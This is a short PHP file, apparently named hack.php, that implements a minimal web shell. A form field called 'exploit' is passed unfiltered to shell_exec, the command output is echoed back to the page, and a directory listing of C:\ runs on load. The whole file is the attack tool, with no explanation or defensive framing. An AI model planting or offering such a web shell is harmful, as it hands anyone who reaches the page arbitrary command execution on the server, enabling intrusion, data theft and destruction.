<?php
$shell=shell_exec('dir C:\\');
if ($_POST['exploit']) {
 $shell=shell_exec($_POST['exploit']);
   echo "<pre>$shell</pre>";
 }
 ?>

<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>
<form action="hack.php" method="post" enctype="multipart/form-data">
	<input type="text" name="exploit">
</form>
</body>
</html>